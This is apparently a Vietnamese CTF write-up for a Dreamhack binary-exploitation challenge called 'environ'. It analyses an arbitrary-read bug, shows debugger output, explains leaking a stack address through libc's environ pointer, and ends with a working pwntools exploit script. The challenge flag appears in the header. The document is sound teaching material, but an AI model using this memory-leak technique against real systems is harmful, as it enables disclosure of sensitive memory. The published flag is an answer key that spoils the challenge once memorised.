# [CTF] - [__environ]

> **Meta Info**
> - **Author:** Hoan (KMA)
> - **Difficulty:** Easy
> - **Flag:** `DH{dd7e95bf7ea608017206757444a1ff168720e0d18ded2aef99558d00e063b8a1}`

---

## PHẦN 1: PHÂN TÍCH BÀI (Challenge Analysis)

### 1. Thông tin chung & Checksec
- **File nhận được:** `environ`, `environ.c ` , `Dockerfile` , `flag` , `libc.so.6`
- **Kết quả checksec:**
  ```bash
      Arch:     amd64-64-little
      RELRO:    Full RELRO
      Stack:    Canary found
      NX:       NX enabled
      PIE:      PIE enabled

### 2. Phân tích tĩnh : 
- Khi vào chương trình sẽ bắt đầu đọc file `flag` và cất nó vào 1 nơi bất kì : 
```
char file_buf[4096];

  int fd = open("./flag", O_RDONLY);
  read(fd, file_buf, sizeof(file_buf) - 1);
  close(fd);
```
- Chương trình in cho ta địa chỉ của `libc`
- Sau đó cho ta nhập `Index` , nếu nhập khác 1 sẽ thoát chương trình , còn không chương trình sẽ cho ta nhập `address` , khi nhập xong chương trình sẽ dùng `%p` để in địa chỉ mà con trỏ của ta mới nhập vào , ví dụ ở `0x123636` trỏ tới chuỗi `okebabe` thì nó sẽ in chuỗi đó ra màn hình , nếu không thể in chương trình sẽ báo lỗi 
```
 while (1) {
    printf("> ");
    scanf("%d", &idx);
    switch (idx) {
      case 1:
        printf("Addr: ");
        scanf("%ld", &addr);
        printf("%s", (char *)addr);
        break;
      default:
        break;
    }
  }
  ```
  - Nó sẽ lặp nhiều lần bắt ta nhập `index` rồi `address` liên tục 

## PHẦN 2: HƯỚNG VÀ CÁCH GIẢI :
---
### 1. Ý tưởng :
- Đầu tiên ta tìm xem `flag` đang ở vùng nhớ nào trong chương trình bằng cách khi chương trình đọc `flag` ta xem các thanh ghi là có thể thấy được dữ liệu ghi vào đâu :
```
AX  0
 RBX  0
*RCX  0x7ffff7d15117 (close+23) ◂— cmp rax, -0x1000 /* 'H=' */
*RDX  0xfff
*RDI  3
*RSI  0x7fffffffc940 ◂— 'DH{**flag**}\n'
 R8   0x7fffffffd8a0 ◂— 0
 R9   0
*R10  0
*R11  0x246
 R12  0x7fffffffde98 —▸ 0x7fffffffe12c ◂— '/home/nguyenngochoan/dreamhack/environ/environ_patched'
 R13  0x555555555366 (main) ◂— endbr64
 R14  0x555555557d78 (__do_global_dtors_aux_fini_array_entry) —▸ 0x555555555220 (__do_global_dtors_aux) ◂— endbr64
 R15  0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 —▸ 0x555555554000 ◂— 0x10102464c457f
 RBP  0x7fffffffdd80 ◂— 1
 RSP  0x7fffffffd960 —▸ 0x7ffff7fbbc10 —▸ 0x7ffff7c1e557 ◂— 'GLIBC_PRIVATE'
*RIP  0x555555555398 (main+50) ◂— mov rax, qword ptr [rip + 0x2c71]
```
- Ở đây ta có thể thấy nó lưu tại địa chỉ `0x7fffffffc940` , để chắc chắn nó nằm ở đâu ta dùng `vmmap` là có thể biết chắc nó đang nằm trên `stack`
```
pwndbg> vmmap 0x7fffffffc940
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
               Start                End Perm     Size  Offset File (set vmmap-prefer-relpaths on)
      0x7ffff7ffd000     0x7ffff7fff000 rw-p     2000   39000 ld-2.35.so
►     0x7ffffffde000     0x7ffffffff000 rw-p    21000       0 [stack] +0x1e940
```
- Chủ ý của tác giả rất rõ : bắt ta ghi địa chỉ đó vào `address` để in `flag` ra , nhưng ta sao có thể lấy được địa chỉ đó ra khi chương trình chạy khi chỉ có địa chỉ của `libc` ? `environ` sẽ giải quyết bài toán này 
- `environ` là biến cục bộ trong `libc` , kiểu con trỏ , nó quản lý mảng chứa danh sách các con trỏ trỏ đến các chuỗi bắt kết thúc = `Null`, ví dụ : `SHELL = /bin/bash` ,...
- Trong con trỏ `environ` trỏ tới 1 con trỏ khác trên stack , con trỏ đó trỏ tới 1 chuỗi . Vì thế khi in `environ` bằng `%p` của `print` nó sẽ in ra địa chỉ ở trên `stack` -> tính `offset` từ đó đến địa chỉ chứa `flag` -> bắt chương trình in ra `flag`

### 2. Kịch bản khai thác : 
```
#!/usr/bin/env python3

from pwn import *

exe = ELF("./environ_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe

p = process(exe.path)
p = remote('host3.dreamhack.games',  15527)


# leak_libc
p.recvuntil(b'stdout: ')
libc_leak = int(p.recvuntil(b'\n'),16)
libc.address = libc_leak - 0x21a780
log.info(f'libc_leak = {hex(libc_leak)}')
log.info(f'libc_adr = {hex(libc.address)}')
input()
p.sendline(b'1')

#leak_stack :
payload = str(libc.sym['environ']).encode()
p.sendline(payload)

p.recvuntil(b'Addr: ')
stack_leak = u64(p.recvuntil(b'> ',drop = True).ljust(8,b'\x00'))
log.info(f'stack_adr = {hex(stack_leak)}')
flag_adr = stack_leak - 0x1568
log.info(f'flag_adr = {hex(flag_adr)}')

#get_flags
p.sendline(b'1')
payload = str(flag_adr).encode()
p.sendline(payload)

p.interactive()
```